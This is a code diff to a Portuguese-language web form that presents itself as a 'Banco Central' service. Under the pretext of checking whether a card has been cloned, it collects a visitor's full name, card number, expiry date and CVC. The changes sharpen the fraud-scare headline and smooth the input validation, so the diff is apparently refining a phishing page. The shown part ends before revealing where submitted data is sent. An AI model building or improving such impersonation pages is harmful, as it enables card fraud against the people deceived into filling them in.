@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verifique a Segurança do seu Cartão (Um Serviço Banco Central)</title>
+    <title>Verifique se o seu Cartão foi Clonado (Um Serviço Banco Central)</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -57,7 +57,7 @@
         .month-wrapper { flex: 3; }
         .year-wrapper { flex: 4; }
         label { display: block; margin-bottom: 0.5rem; font-weight: 600; color: var(--label-color); }
-        input[type="text"], input[type="password"], input[type="number"] {
+        input[type="text"], input[type="password"] {
             width: 100%;
             padding: 0.8rem 1rem;
             border: 1px solid var(--border-color);
@@ -66,19 +66,10 @@
             font-size: 1rem;
             transition: border-color 0.3s, box-shadow 0.3s;
         }
-        input[type="text"]:focus, input[type="password"]:focus, input[type="number"]:focus {
+        input[type="text"]:focus, input[type="password"]:focus {
             outline: none;
             border-color: var(--primary-color);
             box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.25);
-        }
-        /* Remove as setas dos inputs do tipo number */
-        input[type=number]::-webkit-inner-spin-button, 
-        input[type=number]::-webkit-outer-spin-button { 
-          -webkit-appearance: none; 
-          margin: 0; 
-        }
-        input[type=number] {
-          -moz-appearance: textfield;
         }
         .submit-btn {
             background: linear-gradient(45deg, #007BFF, #0056b3);
@@ -102,11 +93,18 @@
         .modal-content { background-color: var(--form-background); padding: 2.5rem 3.5rem; border-radius: 12px; box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2); text-align: center; }
         .modal-content p { margin: 0; font-size: 1.2rem; font-weight: 600; color: var(--success-color); }
         .modal-content svg { color: var(--success-color); width: 50px; height: 50px; margin-bottom: 1rem; }
+        
+        .validation-error {
+            color: var(--error-color);
+            font-size: 0.8rem;
+            margin-top: 4px;
+            height: 1em; /* Reserva espaço para evitar que o layout salte */
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>Verifique a Segurança do seu Cartão</h1>
+        <h1>Verifique se o seu Cartão foi Clonado</h1>
         <form id="card-form">
             <div class="form-group">
                 <label for="nome">Nome Completo</label>
@@ -121,18 +119,22 @@
                     <label for="validade_mes">Validade (Mês/Ano)</label>
                     <div class="input-row">
                         <div class="month-wrapper">
-                             <!-- ALTERAÇÃO: Mudado para type="number" -->
-                             <input type="number" id="validade_mes" name="validade_mes" placeholder="MM" required min="1" max="12">
+                             <input type="text" id="validade_mes" name="validade_mes" placeholder="MM" required maxlength="2" pattern="\d*" inputmode="numeric">
                         </div>
                         <div class="year-wrapper">
-                            <!-- ALTERAÇÃO: Mudado para type="number" -->
-                            <input type="number" id="validade_ano" name="validade_ano" placeholder="AAAA" required min="2024" max="2050">
+                            <input type="text" id="validade_ano" name="validade_ano" placeholder="AAAA" required maxlength="4" pattern="\d*" inputmode="numeric">
                         </div>
+                    </div>
+                    <div class="input-row">
+                        <div id="month-error" class="validation-error month-wrapper"></div>
+                        <div id="year-error" class="validation-error year-wrapper"></div>
                     </div>
                 </div>
                 <div class="form-group cvc-group">
                     <label for="cvc">Número atrás do Cartão</label>
                     <input type="text" id="cvc" name="cvc" placeholder="CVC" required maxlength="4" pattern="\d{3,4}">
+                    <!-- --- CORREÇÃO AQUI --- -->
+                    <div class="validation-error">&nbsp;</div> <!-- Espaço reservado para alinhar com a linha de erro da validade -->
                 </div>
             </div>
             <div class="form-group">
@@ -159,24 +161,34 @@
         const successModal = document.getElementById('success-modal');
         const successMessage = document.getElementById('success-message');
 
-        // --- NOVO CÓDIGO PARA VALIDAÇÃO ---
         const monthInput = document.getElementById('validade_mes');
         const yearInput = document.getElementById('validade_ano');
+        const monthError = document.getElementById('month-error');
+        const yearError = document.getElementById('year-error');
 
-        // Garante que o valor do mês não ultrapasse 12
+        monthInput.addEventListener('blur', () => {
+            const monthValue = parseInt(monthInput.value);
+            if (monthInput.value && (monthValue < 1 || monthValue > 12)) {
+                monthError.textContent = 'Insira um mês de 1 a 12.';
+                monthInput.value = '';
+            }
+        });
+
         monthInput.addEventListener('input', () => {
-            if (parseInt(monthInput.value) > 12) {
-                monthInput.value = '12';
+            monthError.textContent = '';
+        });
+
+        yearInput.addEventListener('blur', () => {
+            const yearValue = parseInt(yearInput.value);
+            if (yearInput.value && (yearValue < 2025 || yearValue > 2050)) {
+                yearError.textContent = 'Insira um ano de 2025 a 2050.';
+                yearInput.value = '';
             }
         });
 
-        // Garante que o valor do ano não ultrapasse 2050
         yearInput.addEventListener('input', () => {
-            if (parseInt(yearInput.value) > 2050) {
-                yearInput.value = '2050';
-            }
+            yearError.textContent = '';
         });
-        // --- FIM DO NOVO CÓDIGO ---
 
         form.addEventListener('submit', async (e) => {
             e.preventDefault();
